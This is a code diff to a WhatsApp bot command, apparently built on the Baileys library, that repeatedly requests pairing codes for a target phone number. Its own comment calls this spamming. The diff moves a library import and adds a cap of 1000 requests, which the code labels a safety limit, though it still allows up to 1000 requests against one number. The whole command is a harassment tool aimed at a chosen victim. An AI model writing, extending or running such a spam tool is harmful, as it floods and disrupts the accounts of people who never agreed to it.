@@ -47,6 +47,7 @@ exports.run = {
          const { state } = await useMultiFileAuthState('pepek')
          const { version } = await fetchLatestBaileysVersion()
          const pino = require("pino")
+         const colors = require('@colors/colors')
          const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })
 
          // Validate count
@@ -56,13 +57,18 @@ exports.run = {
             return client.reply(m.chat, `❌ Invalid count! Please provide a positive number.`, m)
          }
 
+         // Safety limit to prevent abuse
+         if (count > 1000) {
+            await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
+            return client.reply(m.chat, `❌ Count too high! Maximum allowed is 1000.`, m)
+         }
+
          // Start spamming
          client.reply(m.chat, `✅ *Processing spam pairing for ${target} (${count} times)...*`, m)
 
          for (let i = 0; i < count; i++) {
             await Func.delay(1500) // Use existing delay function
             let prc = await sucked.requestPairingCode(target)
-            const colors = require('@colors/colors')
             console.log(colors.bgGreen.black(`_Success Spam Pairing Code - Number: ${target} - Code: ${prc}_`))
          }
 
